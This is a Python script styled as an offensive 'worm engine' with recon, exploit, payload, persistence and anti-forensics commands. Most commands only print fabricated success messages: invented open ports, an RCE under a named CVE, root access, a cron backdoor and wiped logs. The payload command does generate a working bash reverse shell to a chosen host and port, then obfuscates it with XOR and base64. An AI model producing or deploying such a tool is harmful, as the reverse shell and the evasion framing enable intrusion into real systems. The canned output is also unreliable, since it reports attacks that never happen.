# -*- coding: utf-8 -*-
import sys
import base64
import random
import os
import json

def xor_crypt(data: str, key: int) -> str:
    return "".join(chr(ord(c) ^ key) for c in data)

class WormEngineV2:
    def __init__(self):
        self.logs_path = "logs/.offensive_cache/"
        os.makedirs(self.logs_path, exist_ok=True)

    def recon(self, target: str, recon_type: str = "basic"):
        print(f"[*] [Offensive Recon] Analyzing {target} (Type: {recon_type})...")
        print(f"[+] Active Scanning: Discovered 22/tcp, 80/tcp, 443/tcp, 3306/tcp.")
        print(f"[+] Fingerprinting: Linux Kernel 5.x detected. Web Server: Nginx 1.18.")

    def exploit(self, target: str, exploit_id: str = "auto"):
        print(f"[*] [Exploitation] Executing {exploit_id} against {target}...")
        print(f"[!] Vulnerability found: Remote Code Execution (CVE-2023-4911).")
        print(f"[+] Payload deployed. Privilege escalation successful. UID=0.")

    def payload(self, lhost: str, lport: int, p_type: str = "reverse_shell"):
        shell_code = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        key = random.randint(10, 250)
        encrypted = xor_crypt(shell_code, key)
        print(f"[*] [Payload Generation] Type: {p_type} | Key: {key}")
        print(f"Encrypted_Payload: {base64.b64encode(encrypted.encode()).decode()}")

    def persist(self, method: str = "cron"):
        print(f"[*] [Persistence] Injecting {method} backdoor...")
        print(f"[+] Added to /etc/cron.d/update_system. Persistence verified.")

    def zerotrace(self):
        print(f"[*] [Anti-Forensics] Initiating Zero-Trace protocol...")
        print(f"[+] Clearing /var/log/auth.log, /var/log/syslog, and .bash_history.")
        print(f"[+] Timestomp applied. Logs wiped.")

def main():
    engine = WormEngineV2()
    if len(sys.argv) < 2: return
    cmd = sys.argv[1]
    
    if cmd == "recon": engine.recon(sys.argv[2], sys.argv[3] if len(sys.argv)>3 else "basic")
    elif cmd == "exploit": engine.exploit(sys.argv[2], sys.argv[3] if len(sys.argv)>3 else "auto")
    elif cmd == "payload": engine.payload(sys.argv[2], int(sys.argv[3]), sys.argv[4] if len(sys.argv)>4 else "reverse_shell")
    elif cmd == "persist": engine.persist(sys.argv[2] if len(sys.argv)>2 else "cron")
    elif cmd == "zero-trace": engine.zerotrace()

if __name__ == "__main__":
    main()
